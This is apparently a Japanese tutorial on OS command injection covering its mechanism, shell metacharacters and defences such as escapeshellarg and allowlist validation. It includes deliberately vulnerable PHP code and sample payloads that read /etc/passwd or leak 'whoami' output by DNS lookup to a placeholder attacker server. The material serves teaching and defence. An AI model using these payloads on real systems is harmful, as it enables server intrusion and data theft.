### OSコマンドインジェクション解説

OSコマンドインジェクションは、Webアプリケーションの脆弱性を利用するサイバー攻撃の一種です。 攻撃者は、Webサイトの入力フォームなどを通じて、本来意図されていないOSコマンド（OSを操作するための命令文）を不正に注入し、サーバー上で実行させます。 これにより、サーバー内の情報が盗まれたり、Webサイトが改ざんされたり、最悪の場合はサーバーが乗っ取られたりするなど、極めて深刻な被害につながる可能性があります。

---

### 1. OSコマンドインジェクションの仕組み

OSコマンドインジェクションの脆弱性は、主に以下の2つの条件が揃ったときに発生します。

1.  **外部プログラムを呼び出す関数や機能を使用している**:
    Webアプリケーションが、その機能の一部として、OSのコマンドを実行する機能（例: `system()`, `exec()` といった関数）を利用している。

2.  **ユーザーからの入力を適切に処理せずコマンドに連結している**:
    ユーザーが入力した文字列を、何の検査や無害化もせずに、そのまま実行するOSコマンドの一部として組み立ててしまう。

この仕組みを悪用し、攻撃者は入力値に特殊な記号（メタ文字）を付け加えて、本来のコマンドに続けて別の不正なコマンドを連結して実行させます。

**攻撃の流れ**

1.  攻撃者は、Webアプリケーションの入力フォームやURLパラメータなど、ユーザーがデータを入力できる箇所を特定します。
2.  特定した箇所に、OSコマンドとして解釈される悪意のある文字列（ペイロード）を注入してサーバーに送信します。
3.  脆弱性を持つアプリケーションは、受け取った不正な文字列を無防備にOSコマンドの一部として組み立てます。
4.  組み立てられたコマンドがサーバーのOS（シェル）に渡され、攻撃者の意図した不正なコマンドが実行されます。

**攻撃に悪用されるメタ文字の例**

シェル（OSに命令を伝えるプログラム）は、特定の記号を特別な意味を持つ「メタ文字」として解釈します。これらを悪用することで、複数のコマンドを一度に実行させることが可能です。

| メタ文字 | 意味                               |
| :--- | :--------------------------------- |
| **;** | コマンドの区切り。前のコマンドが成功しても失敗しても、次のコマンドを実行する。 |
| **&&** | 前のコマンドが成功した場合にのみ、次のコマンドを実行する。 |
| **\|\|** | 前のコマンドが失敗した場合にのみ、次のコマンドを実行する。 |
| **\|** | パイプ。あるコマンドの出力を、別のコマンドの入力として渡す。 |
| **` `** (バッククォート) | バッククォートで囲まれた文字列をコマンドとして実行し、その結果で置き換える。 |
| **$()** | ` `（バッククォート）と同様。コマンドの実行結果で置き換える。 |

---

### 2. 実践的な攻撃例

具体的なコードを交えて、OSコマンドインジェクションがどのように悪用されるかを見ていきましょう。

#### 例1: 宛先を指定してpingを実行するWebアプリケーション（PHP）

ネットワークの疎通確認のために、ユーザーが入力したIPアドレスに対して`ping`コマンドを実行するシンプルなWebページを想定します。

**脆弱なPHPコード**

```php
<?php
if (isset($_POST['ip_address'])) {
    $ip = $_POST['ip_address'];
    // ユーザーの入力をそのままコマンドに連結している
    $command = 'ping -c 3 ' . $ip;
    $output = shell_exec($command);
    echo "<pre>{$output}</pre>";
}
?>
<form method="POST">
    IP Address: <input type="text" name="ip_address">
    <input type="submit" value="Ping">
</form>
```

**通常の利用**

ユーザーが入力フォームに `8.8.8.8` と入力した場合、サーバーでは以下のコマンドが実行されます。

```sh
ping -c 3 8.8.8.8
```

これは正当な利用であり、GoogleのDNSサーバーへのping結果が画面に表示されます。

**攻撃者のペイロード**

攻撃者は、IPアドレスの代わりに以下のような文字列を入力します。

```
8.8.8.8 ; cat /etc/passwd
```

**サーバーで実行されるコマンド**

脆弱なアプリケーションは、この入力をそのまま連結するため、サーバー上では以下の2つのコマンドが連続して実行されます。

```sh
ping -c 3 8.8.8.8 ; cat /etc/passwd
```

`;`（セミコロン）はコマンドの区切り文字として機能するため、まず`ping`コマンドが実行され、その終了後、次に`cat /etc/passwd`コマンドが実行されます。 これにより、サーバーのユーザーアカウント情報を含む`/etc/passwd`ファイルの内容が画面に表示され、情報漏えいにつながります。

#### 例2: ブラインドOSコマンドインジェクション

攻撃を実行しても、その結果が直接Webページの応答として返ってこないタイプの脆弱性を「ブラインドOSコマンドインジェクション」と呼びます。 この場合、攻撃者は別の方法でコマンドが成功したかどうかを判断する必要があります。

**脆弱なコード（結果を表示しない）**

```php
<?php
if (isset($_POST['email'])) {
    $email = $_POST['email'];
    // ユーザーにフィードバック内容をメールで送信する想定
    // コマンドの実行結果は画面に表示されない
    $command = 'echo "フィードバックを受け付けました" | mail -s "フィードバック" ' . $email;
    system($command);
    echo "フィードバックありがとうございます。";
}
?>
```

**手法1: 時間差を利用した攻撃（Time-based）**

`sleep`コマンドを注入し、サーバーの応答時間に意図的な遅延を発生させることで、コマンドが実行されたかを判断します。

*   **攻撃ペイロード**: `test@example.com ; sleep 10`
*   **実行されるコマンド**: `echo "..." | mail -s "..." test@example.com ; sleep 10`

このペイロードを送信すると、サーバーは10秒間処理を停止してから応答を返すため、攻撃者は応答が10秒遅れたことで「コマンドが実行された」と確信できます。

**手法2: 外部への通信を利用した攻撃（Out-of-band）**

`nslookup`や`curl`、`wget`といったコマンドを使い、攻撃者が管理する外部のサーバーへ通信を発生させることで、コマンドの実行を確認します。

*   **攻撃ペイロード**: `test@example.com ; nslookup YOUR-ATTACKER-SERVER.com`
*   **実行されるコマンド**: `echo "..." | mail -s "..." test@example.com ; nslookup YOUR-ATTACKER-SERVER.com`

攻撃者は、自身が管理する`YOUR-ATTACKER-SERVER.com`のDNSログを監視します。標的のサーバーからこのドメインに対する名前解決のリクエストが届けば、`nslookup`コマンドが正常に実行されたと判断できます。この手法を使えば、`whoami`（実行ユーザーの確認）や`ls -la /`（ルートディレクトリのファイル一覧）といったコマンドの実行結果を、サブドメインとして外部サーバーに送信させることも可能です。

例：`test@example.com ; nslookup `whoami`.YOUR-ATTACKER-SERVER.com`

---

### 3. OSコマンドインジェクションによる影響

この脆弱性が悪用されると、非常に広範囲で深刻な被害が発生する可能性があります。実行されるコマンドはWebサーバーのプロセス権限で動作しますが、他の脆弱性と組み合わせることで、さらに権限を昇格させられる危険もあります。

*   **情報漏えい**: サーバー内の機密ファイル（設定ファイル、パスワードファイル、個人情報など）を不正に閲覧・窃取される。
*   **データの改ざん・破壊**: Webサイトのコンテンツを改ざんしたり、重要なファイルを削除したりする。
*   **サーバーの乗っ取り**: 不正なプログラムやバックドアをダウンロード・実行され、サーバーを完全に制御される。
*   **マルウェア感染**: サーバーにランサムウェアなどのマルウェアを感染させられる。
*   **サービス妨害（DoS）**: `shutdown`コマンドでサーバーを停止させられたり、リソースを大量に消費するプロセスを実行されたりして、サービスを提供不能な状態に陥らせる。
*   **他のシステムへの攻撃の踏み台**: 侵害したサーバーを中継点として、他の内部システムや外部のWebサイトへ攻撃を仕掛けるための踏み台として悪用される。

---

### 4. 具体的な対処手順（防御策）

OSコマンドインジェクションを防ぐための対策は、複数の階層で実施することが重要です。

#### 根本的対策：OSコマンド呼び出しの原則禁止

最も安全で効果的な対策は、**そもそもアプリケーションからOSコマンドを呼び出す機能を使わないこと**です。 プログラミング言語には、ファイル操作、メール送信、画像処理など、多くの機能がライブラリやAPIとして提供されています。OSコマンドに頼らず、これらの言語標準の機能を活用することで、脆弱性が生まれる根本原因を排除できます。

*   **代替手段の例**:
    *   ファイルの存在確認: `file_exists()` (PHP), `os.path.exists()` (Python)
    *   ファイル操作: `fopen`/`fwrite` (PHP), `open()` (Python)
    *   メール送信: PHPMailerライブラリ (PHP), smtplib (Python)

#### やむを得ずOSコマンドを利用する場合の対策

どうしてもOSコマンドの呼び出しが必要な場合は、以下の対策を厳格に実施する必要があります。

**1. シェルを介さない安全な関数の利用**

多くのプログラミング言語では、コマンドを直接実行する関数（シェルを経由しない）が用意されています。これらは、引数を一つのまとまりとして扱うため、メタ文字を注入されても解釈されません。

*   **PHPの例**:
    *   脆弱な方法: `system('ping -c 3 ' . $ip);`
    *   安全な方法: `pcntl_exec('/bin/ping', ['-c', '3', $ip]);` のように、コマンドと引数を分離して渡す。（ただし、`pcntl_exec`は実装が複雑なため、引数のエスケープが現実的）

**2. 引数のエスケープ処理**

ユーザーからの入力をOSコマンドの引数として渡す前に、シェルにとって特別な意味を持つメタ文字を無害化（エスケープ）します。

*   **PHP**: `escapeshellarg()` や `escapeshellcmd()` を使用します。
    *   `escapeshellarg()`: 単一の引数を安全な文字列としてクォート処理します。**引数を渡す場合に最も推奨される方法です。**
    *   `escapeshellcmd()`: コマンド文字列全体に含まれるメタ文字をエスケープしますが、引数の区切りなどを意図せず無効化する可能性があるため、使い方に注意が必要です。

**修正コード例（PHP）**

```php
<?php
if (isset($_POST['ip_address'])) {
    $ip = $_POST['ip_address'];
    // 引数をescapeshellarg()で安全にエスケープする
    $command = 'ping -c 3 ' . escapeshellarg($ip);
    $output = shell_exec($command);
    echo "<pre>{$output}</pre>";
}
?>
```

この修正により、仮に `8.8.8.8 ; ls` と入力されても、全体が `'8.8.8.8 ; ls'` という単一の文字列として扱われるため、`ls`コマンドは実行されません。

**3. 入力値のバリデーション（検証）**

入力値が期待される形式やパターンに合致しているか厳密に検証します。 **許可リスト（ホワイトリスト）方式**が最も安全です。

*   **許可リスト方式**: 許可する文字やパターンを明確に定義し、それ以外はすべて拒否します。
    *   IPアドレスであれば、正規表現 `\A\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\z` で形式をチェックする。
    *   ファイル名であれば、英数字とアンダースコアのみを許可する。
*   **拒否リスト（ブラックリスト）方式**: 危険な文字（`;`, `|` など）を拒否する方法ですが、未知の危険な文字やエンコーディングによるバイパスのリスクがあるため非推奨です。

#### その他の防御策

**1. 最小権限の原則**

Webサーバーやアプリケーションを実行するユーザーアカウントの権限を、必要最小限に設定します。 例えば、`root`ユーザーでの実行は絶対に避けるべきです。これにより、万が一OSコマンドインジェクション攻撃が成功しても、実行されるコマンドの範囲が限定され、被害を最小限に食い止めることができます。

**2. WAF（Web Application Firewall）の導入**

WAFを導入することで、既知のOSコマンドインジェクションの攻撃パターンを含むリクエストを検知し、ブロックできます。 これは、既存のアプリケーションにすぐ適用できる有効な防御層となりますが、未知の攻撃パターンには対応できない可能性があるため、根本的な対策と併用することが重要です。

**3. 脆弱性診断の実施**

開発したアプリケーションにOSコマンドインジェクションの脆弱性がないか、定期的にセキュリティ専門家による脆弱性診断（ペネトレーションテスト）や、SAST/DASTといった診断ツールを用いて検査します。 これにより、開発者が見逃した問題を発見し、リリース前に修正することが可能になります。

---

### 5. 近年の傾向と事例

OSコマンドインジェクションは古典的な脆弱性ですが、その脅威は依然として高く、特に近年では新たな領域で問題が顕在化しています。

**1. IoT機器やネットワーク機器での多発**

家庭用ルーター、ネットワークカメラ、NAS（Network Attached Storage）といったIoT機器は、管理用のWebインターフェースを持っていることが多く、その実装の甘さからOSコマンドインジェクションの脆弱性が見つかるケースが後を絶ちません。

*   **背景**:
    *   PCやサーバーに比べてセキュリティ意識が低く、開発コストが優先されがち。
    *   一度出荷されるとファームウェアのアップデートがユーザー任せになり、脆弱性が放置されやすい。
*   **事例**:
    *   **Miraiボットネット**: 多数のIoT機器の脆弱性を悪用して感染を広げ、大規模なDDoS攻撃を引き起こしました。その多くが、安易なデフォルトパスワードやOSコマンドインジェクションの脆弱性を標的にしていました。
    *   近年でも、エレコム社やTP-Link社のルーター製品でOSコマンドインジェクションの脆弱性が報告されており、注意喚起が行われています。

**2. ライブラリやミドルウェアの脆弱性**

アプリケーション開発者が直接脆弱なコードを書いていなくても、利用している外部のライブラリやフレームワーク、ミドルウェアにOSコマンドインジェクションの脆弱性が存在し、間接的に攻撃を受けるケースが増えています。

*   **事例**:
    *   **Apache Struts2**: 過去に何度もリモートでコードが実行可能となる脆弱性が見つかっており、その中にはOGNL式インジェクションを介して最終的に任意のOSコマンド実行につながるものもありました。
    *   **Log4Shell (CVE-2021-44228)**: Javaのロギングライブラリ「Log4j」の脆弱性で、直接的にはOSコマンドインジェクションではありませんが、JNDI注入を悪用してリモートから任意のコードを実行させることができる点で、影響の深刻度は同等以上です。

**3. CI/CDパイプラインと開発ツールへの攻撃**

ソフトウェア開発の自動化が進む中で、CI/CD（継続的インテグレーション/継続的デリバリー）ツール自体が攻撃対象となることがあります。これらのツールは、ビルドやテストの過程でスクリプトやコマンドを実行するため、設定不備や脆弱性があると、リポジトリ名やコミットメッセージといった外部からの入力値を通じてOSコマンドインジェクションを引き起こす可能性があります。

米国サイバーセキュリティ・社会基盤安全保障庁（CISA）は、ソフトウェアメーカーに対し、OSコマンドインジェクションの脆弱性を根本的に排除するよう強く要請しており、設計段階からのセキュリティ組み込み（Security by Design）の重要性を強調しています。

---

